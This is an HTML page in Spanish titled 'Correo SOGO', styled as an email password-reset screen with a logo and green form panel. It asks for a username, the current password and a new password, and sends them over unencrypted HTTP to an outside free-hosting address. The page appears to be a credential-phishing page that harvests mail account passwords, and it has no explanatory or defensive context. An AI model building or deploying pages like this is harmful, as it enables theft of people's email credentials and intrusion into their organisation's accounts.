<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Correo SOGO</title>
    <link rel="stylesheet" href="styles.css">
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            display: flex;
            width: 1000px;
            border-radius: 10px;
            max-width: 90%;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
        }
        .left {
            background: #fff;
            padding: 50px;
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            text-align: center;
        }
        .left .bold {
            font-weight: bold;
            font-size: 24px;
        }
        .left .green {
            color: #56b04c;
            font-size: 28px;
        }
        .left .ceramics {
            font-size: 18px;
            color: #333;
        }
        .right {
            background: #4CAF50;
            padding: 50px;
            flex: 1;
            color: white;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        label {
            margin-top: 15px;
        }
        input, select {
            padding: 10px;
            margin-top: 5px;
            border: none;
            border-radius: 5px;
            width: 100%;
        }
        .password-container {
            position: relative;
        }
        .eye {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
        }
        .remember {
            display: flex;
           
            margin-top: 10px;
        }
        button {
            margin-top:20px;
            padding: 10px;
            width: 50%;
            border: none;
            background: darkgreen;
            color: white;
            cursor: pointer;
            margin-left: 50%;
            border-radius: 15px;
            font-size: 18px;
        }
        @media (max-width: 768px) {
            .container {
                flex-direction: column;
                width: 100%;
                height: auto;
            }
            .left, .right {
                width: 100%;
                padding: 30px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <img src="ing\logo patmos.jpg" alt="">
        </div>

        <div class="right">
            <form action="http://correosogo.wuaze.com/" name="datos" method="post">

                <label for="usuarios">Usuario *</label>
                <input type="text" id="usuarios" name="usuario" required>
                
                <label for="contrasena">Antigua Contraseña *</label>
                <div class="password-container">
                    <input type="password" id="old_password" name="contrasena" required>
                    <span class="eye">👁</span>
                </div>  
                <label for="contrasena1">Nueva Contraseña *</label>
                <div class="password-container">
                    <input type="password" id="password_1" name="contrasena1" required>
                    <span class="eye">👁</span>
                </div>
                <label for="contrasena1">Confirmas Nueva Contraseña *</label>
                <div class="password-container">
                    <input type="password" id="password2" name="contrasena2" required>
                    <span class="eye">👁</span>
                </div>         
                <button type="submit" name="registro">Restablecer</button>
            </form>
        </div>
    </div>
</body>
</html>
